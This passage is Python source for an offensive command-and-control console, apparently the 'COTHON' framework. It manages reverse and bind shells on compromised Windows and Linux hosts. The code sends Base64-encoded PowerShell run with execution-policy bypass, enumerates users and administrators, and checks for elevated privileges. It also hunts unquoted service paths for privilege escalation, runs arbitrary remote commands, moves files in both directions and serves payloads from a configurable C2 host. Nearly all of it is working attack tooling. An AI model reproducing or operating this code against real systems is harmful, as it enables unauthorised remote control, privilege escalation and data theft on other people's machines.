                if ($results) {{
                    $results | ForEach-Object {{ $_.FullName }}
                }}
                echo [SEARCH_DONE]
                """
            ps_bytes = powershell_script.encode('utf-16le')
            ps_base64 = base64.b64encode(ps_bytes).decode()
            search_cmd = f"powershell -ExecutionPolicy Bypass -EncodedCommand {ps_base64}\n"
        else:
            print("Search not supported for this OS.")
            return

        print(f"Searching for '{filename}' on shell {shell_id} ({shell_type}) ...")

        try:
            with self.lock:
                shell['keepalive_paused'] = True
            conn.sendall(search_cmd.encode())

            output = ""
            end_time = time.time() + 60
            conn.settimeout(5)

            while time.time() < end_time:
                try:
                    data = conn.recv(4096)
                    if data:
                        output += data.decode(errors="replace")
                        if "[SEARCH_DONE]" in output:
                            break
                    else:
                        break
                except socket.timeout:
                    continue

            conn.settimeout(None)
            output = output.replace("[SEARCH_DONE]", "").strip()

            results = [
                line.strip() for line in output.splitlines()
                if line.strip() and not line.startswith("PS ")
            ]

            if results:
                print("\n".join(results))
            else:
                print("No files found.")

        except Exception as e:
            print("Search failed:", e)

        finally:
            with self.lock:
                shell['keepalive_paused'] = False

    def cmd_enum_users(self, cmd: str):

        parts = cmd.split()
        if len(parts) != 2:
            print("Usage: enum_users <shell_id>")
            return

        try:
            shell_id = int(parts[1])
        except ValueError:
            print("Usage: enum_users <shell_id>")
            return

        with self.lock:
            shell = self.shells.get(shell_id)

        if not shell:
            print(f"Shell ID {shell_id} not found.")
            return

        shell_type = shell['type']
        conn = shell['socket']

        print(f"[*] Enumerating users on shell {shell_id} ({shell_type})...")

        try:
            if shell_type == "Windows":

                enum_cmd = (
                    'cmd /c "net user && echo [USERS_DONE] && net localgroup Administrators && echo [PRIV_DONE]"'
                )
            elif shell_type == "Linux":

                enum_cmd = (
                    "echo -n; getent passwd | awk -F: '($3 >= 1000 && $7 ~ /\\/(bash|sh|zsh|dash)$/) || $1 == \"root\" {print $1}'; "
                    "echo [USERS_DONE]; "
                    "(getent group sudo | cut -d: -f4; getent group wheel | cut -d: -f4; getent group admin | cut -d: -f4; echo root) "
                    "| tr ',' '\n' | sort -u; echo [PRIV_DONE]\n"
                )
            else:
                print("User enumeration not supported for this OS.")
                return


            conn.sendall(enum_cmd.encode())

            output = ""
            end_time = time.time() + 30
            users_done = False
            priv_done = False

            while time.time() < end_time:
                try:
                    data = conn.recv(4096).decode(errors="replace")
                    if not data:
                        break
                    output += data

                    if "[USERS_DONE]" in output:
                        users_done = True
                    if "[PRIV_DONE]" in output:
                        priv_done = True

                    if users_done and priv_done:
                        break

                except (socket.timeout, BlockingIOError):
                    continue
                except ConnectionResetError:
                    self.remove_shell(shell_id, reason="connection reset during user enumeration")
                    return

            if not (users_done and priv_done):
                print("[-] User enumeration timed out")
                return


            users_section, priv_section = output.split("[USERS_DONE]")[0].strip(), output.split("[PRIV_DONE]")[
                0].strip()


            def clean_windows_users(raw_text):
                lines = raw_text.splitlines()
                filtered = []
                capture = False
                for line in lines:
                    line = line.strip()
                    if "-----" in line or "The command completed successfully" in line:
                        continue
                    if "User accounts for" in line:
                        capture = True
                        continue
                    if capture and line:
                        filtered.extend(line.split())
                return filtered

            def clean_windows_priv_users(raw_text):
                lines = raw_text.splitlines()
                filtered = []
                capture = False
                for line in lines:
                    line = line.strip()
                    if "Alias name" in line:
                        capture = True
                        continue
                    if "Comment" in line or "Members" in line or "The command completed successfully" in line:
                        continue
                    if "----" in line:
                        continue
                    if capture and line:
                        filtered.append(line)
                return filtered


            if shell_type == "Windows":
                users = clean_windows_users(users_section)
                priv_users = clean_windows_priv_users(priv_section)
            else:
                users = [line.strip() for line in users_section.splitlines() if line.strip()]


                priv_users = list(sorted(set(
                    line.strip() for line in priv_section.replace("[USERS_DONE]", "").splitlines() if line.strip()
                )))


            if users:
                print("\n[+] Local Users:")
                print("\n".join(users))
            else:
                print("\n[-] No local users found.")

            if priv_users:
                print("\n[+] Privileged Users:")
                print("\n".join(priv_users))
            else:
                print("\n[-] No privileged users found.")

        except Exception as e:
            print(f"[-] Enumeration failed: {e}")
        finally:
            with self.lock:
                if shell_id in self.shells:
                    self.shells[shell_id]['keepalive_paused'] = False

    def cmd_kill(self, cmd: str):
        parts = cmd.split()
        if len(parts) != 2:
            print("Usage: kill <shell_id>")
            return
        try:
            shell_id = int(parts[1])
        except ValueError:
            print("Usage: kill <shell_id>")
            return
        self.kill_shell(shell_id)

    def kill_shell(self, shell_id: int):
        with self.lock:
            shell = self.shells.get(shell_id)
            if not shell:
                print(f"[-] Shell ID {shell_id} not found.")
                return
            print(f"[!] Killing shell {shell_id}...")
            try:
                shell['socket'].shutdown(socket.SHUT_RDWR)
                shell['socket'].close()
            except Exception as e:
                print(f"[-] Error closing shell {shell_id}: {e}")
            del self.shells[shell_id]
            print(f"[✓] Shell {shell_id} has been terminated.")

    def _send_heartbeats(self, shell_id: int):

        while True:
            with self.lock:
                if shell_id not in self.command_tracker:
                    break
                shell = self.shells.get(shell_id)
                if not shell or not shell['active']:
                    break

                try:

                    shell['socket'].sendall(b'\n')
                except:
                    break
            time.sleep(12)

    def _healthcheck(self):

        while self.running:
            time.sleep(15)
            with self.lock:
                shells = list(self.shells.items())

            for sid, shell in shells:

                if shell.get('command_running') or sid in self.command_tracker:
                    continue


                try:
                    probe = b'echo KEEPALIVE\n'
                    shell['socket'].sendall(probe)
                    response = b''
                    start = time.time()

                    while time.time() - start < 8:
                        try:
                            chunk = shell['socket'].recv(1024)
                            if not chunk:
                                break
                            response += chunk
                            if b'KEEPALIVE' in response:
                                break
                        except (socket.timeout, BlockingIOError):
                            continue

                    if b'KEEPALIVE' not in response:
                        print(f"[!] Shell {sid} failed keepalive")
                        self.remove_shell(sid, "keepalive timeout")

                except Exception as e:
                    print(f"[!] Shell {sid} keepalive failed: {str(e)}")
                    self.remove_shell(sid, "keepalive error")
    def _user_info(self, conn: socket.socket, shell_type: str) -> tuple:
        try:
            if shell_type == "Windows":
                cmd = (b'cmd /c "hostname & whoami & '
                       b'whoami /groups | findstr S-1-5-32-544 & '
                       b'whoami /priv | findstr SeDebugPrivilege & '
                       b'echo __END__"\n')
            else:
                cmd = b'echo "$(hostname)/$(whoami)" && id -u && echo __END__\n'
            conn.settimeout(2.0)
            conn.sendall(cmd)
            data =  _phoenix_await(conn, 1.0)
            conn.settimeout(None)
            lines = data.decode(errors='replace').splitlines()
            user_info = "unknown/unknown"
            is_elevated = False
            filtered = [line.strip() for line in lines if line.strip() and "__END__" not in line]
            if shell_type == "Windows":
                if len(filtered) >= 2:
                    hostname_str = filtered[0]
                    user_str = filtered[1]
                    if "\\" in user_str:
                        parts = user_str.split("\\", 1)
                        username = parts[1]
                    else:
                        username = user_str
                    if username.lower() == "system":
                        username = "SYSTEM"
                    user_info = f"{hostname_str}/{username}"
                    for line in filtered[2:]:
                        if "S-1-5-32-544" in line or "SeDebugPrivilege" in line:
                            is_elevated = True
                            break
            else:
                if len(filtered) >= 1:
                    user_info = filtered[0]
                if len(filtered) > 1 and filtered[1] == "0":
                    is_elevated = True
            return user_info, is_elevated
        except:
            return "unknown/unknown", False
        finally:
            try:
                conn.settimeout(None)
            except:
                pass

    def remove_shell(self, shell_id: int, reason: str = "no reason"):
        with self.lock:
            shell = self.shells.get(shell_id)
            if not shell:
                return
            if self.active_interaction == shell_id:
                self.active_interaction = None
            try:
                shell['socket'].close()
            except:
                pass
            del self.shells[shell_id]
            print(f"[!] Shell {shell_id} closed (reason: {reason}).")

    def cmd_services(self, cmd: str):

        parts = cmd.split()
        if len(parts) != 2:
            print("Usage: services <shell_id>")
            return
        try:
            shell_id = int(parts[1])
        except ValueError:
            print("Usage: services <shell_id>")
            return

        with self.lock:
            shell = self.shells.get(shell_id)
            if not shell:
                print(f"[-] Shell ID {shell_id} not found.")
                return
            if not shell['active']:
                print(f"[-] Shell {shell_id} is dead or inactive.")
                return

        if shell['type'] != "Windows":
            print("[-] Service enumeration is only supported on Windows shells.")
            return

        conn = shell['socket']
        print(f"[*] Searching for vulnerable Windows services on shell {shell_id}...")


        wmic_command = 'wmic service where "startmode=\'auto\'" get name,pathname,processid,startmode,state,status /format:csv'

        try:
            conn.sendall(wmic_command.encode() + b"\n")
        except Exception as e:
            print(f"[-] Failed to send command: {e}")
            return


        output = ""
        end_time = time.time() + 30
        try:
            conn.settimeout(10)
            while time.time() < end_time:
                try:
                    data = conn.recv(4096)
                    if data:
                        chunk = data.decode(errors="replace")
                        output += chunk
                        if ">" in chunk:
                            break
                    else:
                        break
                except socket.timeout:
                    continue
        except Exception as e:
            print(f"[-] Error reading services output: {e}")
        finally:
            conn.settimeout(None)

        output = output.strip()
        if not output:
            print("[-] No output received from shell.")
            return


        services = []
        lines = output.splitlines()
        if len(lines) < 2:
            print("[-] No services found.")
            return


        for line in lines[1:]:
            if not line.strip():
                continue
            parts = line.split(",")
            if len(parts) < 6:
                continue
            name = parts[1].strip()
            pathname = parts[2].strip()
            processid = parts[3].strip()
            startmode = parts[4].strip()
            state = parts[5].strip()
            status = parts[6].strip()


            if (
                    startmode.lower() == "auto" and
                    "c:\\windows\\" not in pathname.lower() and
                    not pathname.strip().startswith('"')
            ):
                services.append({
                    "Name": name,
                    "PathName": pathname,
                    "ProcessId": processid,
                    "StartMode": startmode,
                    "State": state,
                    "Status": status
                })

        if not services:
            print("[*] No vulnerable services found.")
            return


        print("\n[+] Detected Vulnerable Services:\n")
        columns = ["Name", "PathName", "ProcessId", "StartMode", "State", "Status"]
        column_widths = [20, 80, 10, 10, 10, 10]

        header = " | ".join("{:<{}}".format(col, width) for col, width in zip(columns, column_widths))
        separator = "-" * len(header)
        print(header)
        print(separator)

        for svc in services:
            row = " | ".join("{:<{}}".format(svc[col], width) for col, width in zip(columns, column_widths))
            print(row)


    def cmd_shell(self, cmd: str):
        parts = cmd.split()
        if len(parts) != 2:
            print("Usage: shell <shell_id>")
            return
        try:
            shell_id = int(parts[1])
        except ValueError:
            print("Usage: shell <shell_id>")
            return
        with self.lock:
            shell = self.shells.get(shell_id)
            if not shell:
                print(f"[-] Shell ID {shell_id} not found.")
                return
            if not shell['active']:
                print(f"[-] Shell {shell_id} is dead or inactive.")
                return
        self._shell_menu(shell_id)

    def cmd_run(self, cmd: str, shell_id: int = None):
        if shell_id is None:
            parts = cmd.split(maxsplit=2)
            if len(parts) < 3:
                print("Usage: run <shell_id> <command>")
                return
            try:
                shell_id = int(parts[1])
            except ValueError:
                print("Invalid shell ID")
                return
            command = parts[2]
        else:
            parts = cmd.split(maxsplit=1)
            command = parts[1] if len(parts) > 1 else ""

        if not command:
            print("Usage: run <command>")
            return

        with self.lock:
            shell = self.shells.get(shell_id)
            if not shell:
                print(f"[-] Shell ID {shell_id} not found.")
                return
            if not shell.get('active'):
                print(f"[-] Shell {shell_id} is dead or inactive.")
                return

        def _exec_run():
            try:
                conn = shell['socket']
                if shell['type'] == "Windows":
                    cmd_to_send = f"cmd /c {command}\n"
                else:
                    cmd_to_send = f"{command}\n"
                conn.sendall(cmd_to_send.encode())
                output_lines = []
                end_time = time.time() + 30
                conn.settimeout(5)
                while time.time() < end_time:
                    try:
                        data = conn.recv(4096)
                        if not data:
                            break
                        decoded = data.decode(errors="replace")
                        output_lines.append(decoded)
                        if shell['type'] == "Windows" and ">" in decoded:
                            break
                        elif shell['type'] == "Linux" and (
                                decoded.strip().endswith("$") or decoded.strip().endswith("#")):
                            break
                    except (socket.timeout, BlockingIOError):
                        continue
                output = "".join(output_lines).strip()
                lines = output.splitlines()
                if lines and lines[-1].strip().startswith("PS ") and lines[-1].strip().endswith(">"):
                    lines = lines[:-1]
                output = "\n".join(lines)
                if output:
                    print(f"\n[+] received output (Shell {shell_id}):")
                    print("-" * 60)
                    print(output)
                    print("-" * 60)


                else:
                    print(f"\n[+] received output (Shell {shell_id}): No output returned.")

            except Exception as e:
                print(f"[-] Error executing command: {str(e)}")

        threading.Thread(target=_exec_run, daemon=True).start()
        print(f"[+] Tasked shell {shell_id} to run: {command}")

    def _exec_pwd(self, shell_id: int, command: str):


        def _exec():
            try:
                with self.lock:
                    shell = self.shells.get(shell_id)
                    if not shell or not shell.get('active'):
                        print("[-] Shell is not active")
                        return
                    conn = shell['socket']
                    shell_type = shell['type']


                if command.startswith("cd "):
                    new_dir = command.split(" ", 1)[1].strip()
                    if shell_type == "Windows":
                        cd_cmd = f"cd /d {new_dir}\n"
                    else:
                        cd_cmd = f"cd {new_dir}\n"


                    conn.sendall(cd_cmd.encode())


                    verify_cmd = "cd\n" if shell_type == "Windows" else "pwd\n"
                    conn.sendall(verify_cmd.encode())


                    output = ""
                    end_time = time.time() + 10
                    conn.settimeout(5)
                    while time.time() < end_time:
                        try:
                            data = conn.recv(4096).decode(errors="replace")
                            if not data:
                                break
                            output += data
                            if shell_type == "Windows" and ">" in data:
                                break
                            elif shell_type == "Linux" and ("$ " in data or "# " in data):
                                break
                        except (socket.timeout, BlockingIOError):
                            continue

                   
                    if shell_type == "Windows":
                        current_dir = output.splitlines()[0].strip()
                    else:
                        current_dir = output.splitlines()[0].strip()

                    with self.lock:
                        shell['current_dir'] = current_dir
                    print(f"\n[+] Changed directory to (Shell {shell_id}): {current_dir}\n")

               
                else:
                    if shell_type == "Windows":
                        cmd = "cmd /c cd\n"  
                    else:
                        cmd = "pwd\n"

                    conn.sendall(cmd.encode())
                    output = ""
                    end_time = time.time() + 10
                    conn.settimeout(5)
                    while time.time() < end_time:
                        try:
                            data = conn.recv(4096).decode(errors="replace")
                            if not data:
                                break
                            output += data
                            if shell_type == "Windows" and ">" in data:
                                break
                            elif shell_type == "Linux" and ("$ " in data or "# " in data):
                                break
                        except (socket.timeout, BlockingIOError):
                            continue

                    if shell_type == "Windows":
                        current_dir = output.splitlines()[0].strip()
                    else:
                        current_dir = output.splitlines()[0].strip()

                    print(f"\n[+] Current directory is (Shell {shell_id}): {current_dir}\n")

            except Exception as e:
                print(f"[-] Error executing command: {str(e)}")

        
        threading.Thread(target=_exec, daemon=True).start()
        if command.startswith("cd "):
            print(f"[+] Tasked shell {shell_id} to change directory...")
        else:
            print(f"[+] Tasked shell {shell_id} to print working directory...")

    def _exec_ls(self, shell_id: int, command: str):
        def _execute():
            try:
                with self.lock:
                    shell = self.shells.get(shell_id)
                    if not shell or not shell.get('active'):
                        print("[-] Shell is not active")
                        return
                    shell['keepalive_paused'] = True
                    conn = shell['socket']
                    shell_type = shell['type']

                if shell_type == "Windows":
                    cmd = f"cmd /c dir {command}\n"  
                else:
                    cmd = f"ls -la {command}\n" if command else "ls -la\n"

                conn.sendall(cmd.encode())
                output = ""
                end_time = time.time() + 30
                conn.settimeout(5)
                while time.time() < end_time:
                    try:
                        data = conn.recv(4096).decode(errors="replace")
                        if not data:
                            break
                        output += data
                        if shell_type == "Windows" and ">" in data:
                            break
                    except (socket.timeout, BlockingIOError):
                        continue

                if shell_type == "Windows":
                    output = output.replace(" Volume in drive", "").strip()
                    lines = output.splitlines()
                    filtered = [line for line in lines if not re.match(r"^PS .*?>\s*$", line)]
                    output = "\n".join(filtered).strip()
                else:
                    output = output.strip()

                print(f"\n[+] Listing: (Shell {shell_id}):")
                print("-" * 60)
                print(output)
                print("-" * 60)
            except Exception as e:
                print(f"[-] Error executing ls: {str(e)}")
            finally:
                with self.lock:
                    if shell:
                        shell['keepalive_paused'] = False

        threading.Thread(target=_execute, daemon=True).start()
        print(f"[+] Tasked {shell_id} to list files")

    def _shell_menu(self, shell_id: int):
        with self.lock:
            shell = self.shells.get(shell_id)
            if shell:
                shell['keepalive_paused'] = True
                self.active_interaction = shell_id
        while self.running:
            readline.parse_and_bind("set editing-mode vi")
            try:
                sub_cmd = input(f"shell-{shell_id}> ").strip()
            except EOFError:
                break
            if not sub_cmd:
                continue
            if sub_cmd in ["back", "exit", "quit"]:
                with self.lock:
                    if shell:
                        shell['background'] = True
                        shell['keepalive_paused'] = False
                    if self.active_interaction == shell_id:
                        self.active_interaction = None
                print("[*] Returning to main menu.")
                break
            if sub_cmd == "help":
                self.show_shell_help()
                continue
            tokens = sub_cmd.split()
            c = tokens[0].lower()
            if c == "info":
                self.cmd_info(f"info {shell_id}")
            elif c == "interact":
                self.cmd_interact(f"interact {shell_id}")
            elif c == "kill":
                self.cmd_kill(f"kill {shell_id}")
                break
            elif c == "upload":
                if len(tokens) == 3:
                    self.cmd_upload(f"upload {shell_id} {tokens[1]} {tokens[2]}")
                else:
                    print("Usage: upload <local_path> <remote_path>")
            elif c == "download":
                if len(tokens) == 3:
                    self.cmd_download(f"download {shell_id} {tokens[1]} {tokens[2]}")
                else:
                    print("Usage: download <remote_path> <local_path>")
            elif c == "services":
                self.cmd_services(f"services {shell_id}")
            elif c == "run":
                if len(tokens) >= 2:
                    self.cmd_run(sub_cmd, shell_id=shell_id)
                else:
                    print("Usage: run <command>")
            elif c == "search":
                if len(tokens) == 2:
                    self.cmd_search(f"search {shell_id} {tokens[1]}")
                else:
                    print("Usage: search <filename>")
            elif c == "enum_users":
                self.cmd_enum_users(f"enum_users {shell_id}")
            elif c == "ps":
                self._exec_ps(shell_id)
            elif c == "cd ":
                if len(tokens) > 1:
                    path = " ".join(tokens[1:])
                    cmd = f"cd {path}"
                    self._exec_pwd(shell_id, cmd)
                else:
                    print("Usage: cd <directory>")

            elif c == "pwd":
                with self.lock:
                    shell = self.shells.get(shell_id)
                    if not shell or not shell.get('active'):
                        print("[-] Shell is not active")
                        continue
                    shell_type = shell['type']
                cmd = "cd" if shell_type == "Windows" else "pwd"
                self._exec_pwd(shell_id, cmd)
            elif c == "ls":
                with self.lock:
                    shell = self.shells.get(shell_id)
                    if not shell or not shell.get('active'):
                        print("[-] Shell is not active")
                        continue
                    shell_type = shell['type']
                path = tokens[1] if len(tokens) > 1 else ""
                cmd_str = f"dir {path}" if shell_type == "Windows" and path else (
                    "dir" if shell_type == "Windows" else f"ls -la {path}" if path else "ls -la")
                self._exec_ls(shell_id, cmd_str)
            else:
                print("Unknown sub-command. Type 'help' or 'back' to return.")
        with self.lock:
            if shell:
                shell['keepalive_paused'] = False
            if self.active_interaction == shell_id:
                self.active_interaction = None

    def show_shell_help(self):
        print(r"""
    Available Commands:

      info                          Show extended info about the current shell
      interact                      Enter interactive session with the current shell
      kill                          Kill the current shell
      upload <local_path> <remote_path> Upload a local file to the remote shell
      download <remote_path> <local_path> Download a file from the remote shell
      search <filename>             Search for a file on the remote shell
      enum_users                    Enumerate current users on the remote shell
      services                      List vulnerable services (unquoted paths) on the remote shell
      run <command>                 exec a command on the remote shell in the background
      pwd                           Show current working directory on the remote shell
      ls [path]                     List directory contents (optional path)
      back                          Return to the main menu
    """)

    def command_interface(self):
        while self.running:
            readline.parse_and_bind("set editing-mode vi")
            try:
                cmd = input("\nCothon> ").strip()
            except EOFError:
                break
            if not cmd:
                continue

            self.command_history.append(cmd)


            if cmd.lower() == "history":
                print("\n[+] Command History")
                for i, command in enumerate(self.command_history, start=1):
                    print(f" {i}: {command}")
                continue

            if cmd == "help":
                show_help()
            elif cmd == "shells":
                self.list_shells()
            elif cmd.startswith("shell "):
                self.cmd_shell(cmd)
            elif cmd.startswith("info "):
                self.cmd_info(cmd)
            elif cmd.startswith("interact"):
                self.cmd_interact(cmd)
            elif cmd.startswith("kill "):
                self.cmd_kill(cmd)
            elif cmd.startswith("upload "):
                self.cmd_upload(cmd)
            elif cmd.startswith("download "):
                self.cmd_download(cmd)
            elif cmd.startswith("search "):
                self.cmd_search(cmd)

            elif cmd.startswith("ps "):
                parts = cmd.split()
                if len(parts) != 2:
                    print("Usage: ps <shell_id>")
                    continue
                try:
                    shell_id = int(parts[1])
                    self._exec_ps(shell_id)
                except ValueError:
                    print("Invalid shell ID")

            elif cmd.startswith("listen "):
                parts = cmd.split()
                if len(parts) != 2:
                    print("Usage: listen <port>")
                    continue
                try:
                    port = int(parts[1])
                except ValueError:
                    print("Invalid port number.")
                    continue
                self._start_listener(port)
            elif cmd.startswith("listeners"):
                parts = cmd.split()
                if len(parts) == 1:

                    self.list_listeners()
                elif len(parts) == 3 and parts[2].lower() == "stop":
                    try:
                        port = int(parts[1])
                    except ValueError:
                        print("Invalid port number.")
                        continue
                    self._stop_listener(port)
                else:
                    print("Usage: listeners OR listeners <port> stop")

            elif cmd.startswith("connect "):
                parts = cmd.split()
                if len(parts) != 3:
                    print("Usage: connect <host> <port>")
                    continue
                host = parts[1]
                try:
                    port = int(parts[2])
                except ValueError:
                    print("Invalid port number.")
                    continue
                self.connect_bind_shell(host, port)
            elif cmd.startswith("enum_users "):
                self.cmd_enum_users(cmd)
            elif cmd.startswith("set lhost "):
                parts = cmd.split(maxsplit=2)
                if len(parts) != 3:
                    print("Usage: set lhost <address>")
                    continue
                new_lhost = parts[2]
                self.c2_ip = new_lhost
                print(f"[+] lhost set to {new_lhost}")
                self.start_http_server()
            elif cmd.startswith("set hport "):
                parts = cmd.split(maxsplit=2)
                if len(parts) != 3:
                    print("Usage: set hport <port>")
                    continue
                try:
                    new_hport = int(parts[2])
                except ValueError:
                    print("[-] Invalid port value")
                    continue
                self.hport = new_hport
                print(f"[+] hport set to {new_hport}")
                self.start_http_server()

            elif cmd.startswith("set ssl "):
                parts = cmd.split(maxsplit=2)
                if len(parts) != 3:
                    print("Usage: set ssl <true/false>")
                    continue
                new_ssl = parts[2].lower() in ("true", "1", "yes")
                self.use_ssl = new_ssl
                print(f"[+] SSL set to {self.use_ssl}. Restarting HTTP server...")
                self.start_http_server()

            elif cmd.startswith("services "):
                self.cmd_services(cmd)
            elif cmd.startswith("run "):
                self.cmd_run(cmd)


            elif cmd.startswith("cd "):

                parts = cmd.split(maxsplit=2)

                if len(parts) < 3:
                    print("Usage: cd <shell_id> <directory>")

                    continue

                try:

                    shell_id = int(parts[1])

                    directory = parts[2]

                except ValueError:

                    print("Invalid shell ID format")

                    continue

                with self.lock:

                    shell = self.shells.get(shell_id)

                    if not shell:
                        print(f"Shell {shell_id} not found")

                        continue

                    if not shell['active']:
                        print(f"Shell {shell_id} is inactive")

                        continue

               

                if shell['type'] == "Windows":

                    cmd_str = f"cd /d {directory}"

                else:

                    cmd_str = f"cd {directory}"

                self._exec_pwd(shell_id, cmd_str)


            elif cmd.startswith("pwd "):
                parts = cmd.split()
                if len(parts) != 2:
                    print("Usage: pwd <shell_id>")
                    continue
                try:
                    shell_id = int(parts[1])
                except ValueError:
                    print("Invalid shell ID")
                    continue
                with self.lock:
                    shell = self.shells.get(shell_id)
                    if not shell:
                        print(f"Shell {shell_id} not found")
                        continue
                    if not shell['active']:
                        print(f"Shell {shell_id} is inactive")
                        continue
                command = "cd" if shell['type'] == "Windows" else "pwd"
                self._exec_pwd(shell_id, command)
            elif cmd.startswith("ls "):
                parts = cmd.split()
                if len(parts) < 2:
                    print("Usage: ls <shell_id> [path]")
                    continue
                try:
                    shell_id = int(parts[1])
                except ValueError:
                    print("Invalid shell ID")
                    continue
                with self.lock:
                    shell = self.shells.get(shell_id)
                    if not shell:
                        print(f"Shell {shell_id} not found")
                        continue
                    if not shell['active']:
                        print(f"Shell {shell_id} is inactive")
                        continue
                path = " ".join(parts[2:]) if len(parts) > 2 else ""
                command = f"dir {path}" if shell['type'] == "Windows" and path else (
                    "dir" if shell['type'] == "Windows" else f"ls -la {path}" if path else "ls -la")
                self._exec_ls(shell_id, command)
            elif cmd == "exit":
                self.running = False
                os._exit(0)
            else:
                print("Unknown command. Type 'help' for usage.")


COTHON_ASCII = r"""


  .,-:::::     ...   :::::::::::: ::   .:;     ...   :::.    :::.
,;;;'````'  .;;;;;;;.;;;;;;;;'''',;;   ;;,  .;;;;;;;.`;;;;,  `;;;
[[[        ,[[     \[[,   [[    ,[[[,,,[[[ ,[[     \[[,[[[[[. '[[
&&&        &&&,     &&&   &&    "&&&;;;&&& &&&,     &&&&&& "C&&&&
`11;,,__,,,"111,_ _,11:   11,    111   "11;"111,_ _,11;111    H11
  "::::::::" ":::::::"    :::    :::    :::  ":::::::" :::     ::

        {NAME}
"""

COLORS = {
    "red": "\033[91m",
    "cyan": "\033[96m",
    "blue": "\033[94m",
    "yellow": "\033[93m",
    "pink": "\033[38;5;218m",
    "reset": "\033[0m"
}


def _ascii_art():


    art = COTHON_ASCII.replace("{NAME}", f"{COLORS['yellow']}COTHON Framework By blue0x1{COLORS['cyan']}")
    print(f"{COLORS['pink']}{art}{COLORS['reset']}")



def main():
    _ascii_art()
    if not os.path.exists("cert.pem") or not os.path.exists("key.pem"):
        os.system(
            "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost' > /dev/null 2>&1 &")
    parser = argparse.ArgumentParser(description="cothon SHELL")
    parser.add_argument('--port', type=int, help='Reverse shell listener port')
    parser.add_argument('--lhost', type=str, default="0.0.0.0", help='C2 server IP for payloads')
    parser.add_argument('--hport', type=int, default=8081, help='HTTP server port')
    parser.add_argument('--ssl', action='store_true', help='Enable HTTPS (SSL/TLS)')
    args = parser.parse_args()
    bridge = SiegeTower(lhost=args.lhost, hport=args.hport, use_ssl=args.ssl)
    if args.port:
        bridge._start_listener(args.port)
    bridge.command_interface()

if __name__ == "__main__":
    main()

